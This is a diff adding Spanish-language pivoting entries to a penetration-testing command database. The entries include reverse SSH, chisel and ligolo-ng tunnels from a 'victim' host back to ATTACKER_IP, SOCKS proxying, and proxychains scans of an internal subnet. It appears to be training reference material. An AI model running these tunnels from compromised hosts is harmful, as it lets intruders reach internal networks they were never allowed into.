@@ -7,7 +7,7 @@
     "totalGuides": 10,
     "totalConcepts": 74,
     "totalPaths": 14,
-    "totalCommandMetadata": 147
+    "totalCommandMetadata": 162
   },
   "tags": [
     "active-directory",
@@ -11395,6 +11395,355 @@
         "Sin salida a tu IP"
       ],
       "alternative": "powershell iwr / SMB",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "ss -tulpen",
+      "objective": "Ver puertos en escucha en el host pivote",
+      "tool": "ss",
+      "environment": "target",
+      "targetOS": "linux",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Servicios locales (127.0.0.1) no expuestos fuera.",
+      "successSignal": "Un puerto interno interesante (db, panel) para tunelizar.",
+      "commonErrors": [
+        "ss no disponible: usa netstat"
+      ],
+      "alternative": "netstat -tulpen",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "arp -a",
+      "objective": "Descubrir otros hosts de la red interna",
+      "tool": "arp",
+      "environment": "target",
+      "targetOS": "any",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Vecinos con los que el pivote ya ha hablado.",
+      "successSignal": "IPs internas nuevas que atacar por el tunel.",
+      "commonErrors": [
+        "Tabla ARP vacia (sin trafico reciente)"
+      ],
+      "alternative": "ping sweep / nmap -sn",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "ssh -D 1080 -N user@$IP",
+      "objective": "Montar un proxy SOCKS dinamico por SSH",
+      "tool": "ssh",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": true,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "Credencial SSH en el host pivote"
+      ],
+      "expectedOutput": "Un SOCKS local en 1080 que sale por el pivote.",
+      "successSignal": "Con proxychains alcanzas la red interna del pivote.",
+      "commonErrors": [
+        "SSH sin acceso o -D bloqueado"
+      ],
+      "alternative": "chisel R:socks",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "ssh -R 9001:127.0.0.1:9001 user@ATTACKER_IP",
+      "objective": "Reenvio remoto: exponer un puerto en tu Kali",
+      "tool": "ssh",
+      "environment": "target",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "password",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "SSH desde la victima hacia tu maquina"
+      ],
+      "expectedOutput": "El puerto 9001 de la victima aparece en tu Kali.",
+      "successSignal": "Recibes en local un servicio interno de la victima.",
+      "commonErrors": [
+        "GatewayPorts/AllowTcpForwarding desactivado"
+      ],
+      "alternative": "chisel R:9001",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "chisel server -p 8000 --reverse",
+      "objective": "Levantar el servidor chisel (en tu Kali)",
+      "tool": "chisel",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Un servidor a la espera de agentes chisel.",
+      "successSignal": "Queda escuchando para recibir el reverse del pivote.",
+      "commonErrors": [
+        "Puerto 8000 ocupado o filtrado"
+      ],
+      "alternative": "ligolo-ng",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "./chisel client ATTACKER_IP:8000 R:socks",
+      "objective": "Crear un SOCKS inverso desde el pivote",
+      "tool": "chisel",
+      "environment": "target",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "chisel server corriendo en tu Kali"
+      ],
+      "expectedOutput": "Un SOCKS en tu Kali que sale por el pivote.",
+      "successSignal": "proxychains ya llega a la red interna.",
+      "commonErrors": [
+        "El agente no conecta (firewall de salida)"
+      ],
+      "alternative": "R:8080:IP:80 para un puerto suelto",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "sudo ip tuntap add user $USER mode tun ligolo",
+      "objective": "Crear la interfaz tun para ligolo-ng",
+      "tool": "ligolo",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "root",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "Una interfaz 'ligolo' lista para enrutar.",
+      "successSignal": "La interfaz aparece en ip a para anadirle rutas.",
+      "commonErrors": [
+        "Falta permiso root"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "./proxy -selfcert -laddr 0.0.0.0:11601",
+      "objective": "Arrancar el proxy ligolo-ng (en tu Kali)",
+      "tool": "ligolo",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "La consola de ligolo esperando agentes.",
+      "successSignal": "Queda a la escucha en 11601 con cert autofirmado.",
+      "commonErrors": [
+        "11601 ocupado"
+      ],
+      "alternative": "chisel",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "./agent -connect ATTACKER_IP:11601 -ignore-cert",
+      "objective": "Conectar el agente ligolo desde el pivote",
+      "tool": "ligolo",
+      "environment": "target",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "caution",
+      "preconditions": [
+        "Proxy ligolo corriendo en tu Kali"
+      ],
+      "expectedOutput": "El pivote aparece como sesion en la consola.",
+      "successSignal": "Tras session/start, enrutas la red interna por tun.",
+      "commonErrors": [
+        "No conecta (salida bloqueada)"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "sudo ip route add 10.10.20.0/24 dev ligolo",
+      "objective": "Enrutar la subred interna por ligolo",
+      "tool": "ligolo",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "root",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [
+        "Sesion ligolo activa (start)"
+      ],
+      "expectedOutput": "El trafico a esa subred sale por el tunel.",
+      "successSignal": "Alcanzas las IPs internas sin proxychains.",
+      "commonErrors": [
+        "Ruta/subred equivocada"
+      ],
+      "alternative": "",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf",
+      "objective": "Apuntar proxychains a tu proxy SOCKS",
+      "tool": "proxychains",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "proxychains usara ese SOCKS para todo.",
+      "successSignal": "La linea queda al final del conf (ultimo proxy gana).",
+      "commonErrors": [
+        "Puerto SOCKS distinto al del tunel",
+        "Lineas socks previas confunden"
+      ],
+      "alternative": "editar el conf a mano",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "proxychains curl http://10.10.20.5/",
+      "objective": "Alcanzar un servicio interno via proxychains",
+      "tool": "proxychains",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "SOCKS levantado y configurado en proxychains"
+      ],
+      "expectedOutput": "La respuesta del servicio interno a traves del tunel.",
+      "successSignal": "Recibes HTML/headers de una IP no enrutable directa.",
+      "commonErrors": [
+        "SOCKS caido",
+        "El host interno no responde"
+      ],
+      "alternative": "ligolo (ruta directa)",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "proxychains nmap -sT -Pn -p80,445 10.10.20.5",
+      "objective": "Escanear un host interno por el tunel",
+      "tool": "proxychains",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "medium",
+      "risk": "caution",
+      "preconditions": [
+        "Tunel SOCKS activo"
+      ],
+      "expectedOutput": "Puertos del host interno (solo TCP connect).",
+      "successSignal": "Ves servicios internos para atacar.",
+      "commonErrors": [
+        "-sS no funciona por SOCKS (usa -sT)",
+        "Muy lento: reduce puertos"
+      ],
+      "alternative": "ligolo + nmap normal",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "nslookup intranet.local DNS_INTERNO",
+      "objective": "Resolver nombres usando el DNS interno",
+      "tool": "nslookup",
+      "environment": "target",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "low",
+      "risk": "safe",
+      "preconditions": [
+        "Saber la IP del DNS interno (resolv.conf)"
+      ],
+      "expectedOutput": "La IP interna del nombre consultado.",
+      "successSignal": "Traduces hostnames del dominio a IPs para atacar.",
+      "commonErrors": [
+        "El DNS interno no responde desde el pivote"
+      ],
+      "alternative": "dig @DNS_INTERNO",
+      "checkedVersion": "2025.1",
+      "reviewedAt": "2026-07-11"
+    },
+    {
+      "sectionSlug": "pivoting",
+      "command": "echo '10.10.20.5 intranet.local' | sudo tee -a /etc/hosts",
+      "objective": "Fijar un nombre interno en tu /etc/hosts",
+      "tool": "hosts",
+      "environment": "attacker",
+      "targetOS": "network",
+      "credentialsRequired": false,
+      "credentialType": "none",
+      "privileges": "user",
+      "noise": "silent",
+      "risk": "safe",
+      "preconditions": [],
+      "expectedOutput": "El nombre resuelve a esa IP en tu maquina.",
+      "successSignal": "Puedes usar el hostname (util para vhosts/TLS internos).",
+      "commonErrors": [
+        "IP o nombre equivocados"
+      ],
+      "alternative": "",
       "checkedVersion": "2025.1",
       "reviewedAt": "2026-07-11"
     }
